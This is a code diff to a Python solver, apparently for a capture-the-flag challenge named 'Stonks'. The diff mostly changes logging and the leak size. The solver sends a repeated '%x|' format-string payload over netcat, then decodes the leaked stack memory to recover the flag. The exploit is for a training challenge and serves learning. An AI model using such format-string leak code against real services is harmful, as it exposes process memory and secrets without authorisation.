@@ -2,7 +2,6 @@
 
 import os
 import re
-import sys
 import subprocess
 
 from termcolor import colored
@@ -13,7 +12,7 @@ def main():
 
 
 class Stonks:
-    STACK_LEAK_SIZE = 128
+    STACK_LEAK_SIZE = 32
 
     def __init__(self, host: str, port: int) -> None:
         """Initialize."""
@@ -36,34 +35,34 @@ class Stonks:
         print(os.environ.get('FLAG_STYLE')
               .replace('\\n', '\n')
               .replace('\\e', '\033')
-              .replace('%s', flag))
+              .replace('%s', flag), end='')
 
     def nc(self) -> bytes:
         """Use netcat to connect to the server, and send the exploit."""
 
-        inp = "{}\n{}\n".format(1, ("%x|" * self.STACK_LEAK_SIZE)[:-1])
+        inp = "{}\n{}\n".format(1, ("%x|" * self.STACK_LEAK_SIZE)[:-1]).encode()
 
-        print("\n{} {}...\n{}".format(
-            colored(f'nc', 'blue', attrs=['bold']),
-            colored(f'{self.host} {self.port}', 'yellow', attrs=['bold']),
-            colored(inp, 'green'),
+        print("\n{}, {}".format(
+            colored(f"Call nc {self.host} {self.port}", 'blue', attrs=['bold']),
+            colored(inp, 'yellow'),
         ))
 
         data = subprocess.run(
             ["nc", str(self.host), str(self.port)],
-            input=inp.encode(),
+            input=inp,
             capture_output=True
         ).stdout
 
-        print(data.decode())
+        print(data)
 
         return data
 
     def exctract(self, context: bytes, pattern: bytes, name: str) -> str:
         """Extract pattern from context."""
 
-        print("\n{}...".format(
-            colored(f"Extracting {name}", 'blue', attrs=['bold']),
+        print("\n{}, {}".format(
+            colored(f"Extract {name}", 'blue', attrs=['bold']),
+            colored(pattern, 'yellow'),
         ))
 
         extracted = re.search(pattern, context).group(1)
@@ -75,8 +74,12 @@ class Stonks:
     def parse(self, memory) -> bytes:
         """Parse the bytes."""
 
-        print("\n{}...".format(
-            colored("Parsing memory bytes", 'blue', attrs=['bold']),
+        print("\n{}, {} -> {} -> {} -> {}".format(
+            colored("Parse memory bytes", 'blue', attrs=['bold']),
+            colored("split(b'|')", 'yellow'),
+            colored("decode", 'yellow'),
+            colored("reverse", 'yellow'),
+            colored("join", 'yellow')
         ))
 
         def decode(hex: bytes) -> bytes:
@@ -86,7 +89,7 @@ class Stonks:
             except ValueError:
                 return hex
 
-        decoded = b''.join(map(decode, (b for b in memory.split(b'|'))))
+        decoded = b''.join(map(decode, (byte for byte in memory.split(b'|'))))
 
         print(decoded)
 
@@ -95,8 +98,8 @@ class Stonks:
     def decode(self, flag: bytes) -> str:
         """Decode the flag."""
 
-        print("\n{}...".format(
-            colored("Decoding", 'blue', attrs=['bold']),
+        print("\n{}".format(
+            colored("Decode", 'blue', attrs=['bold']),
         ))
 
         return flag.decode()
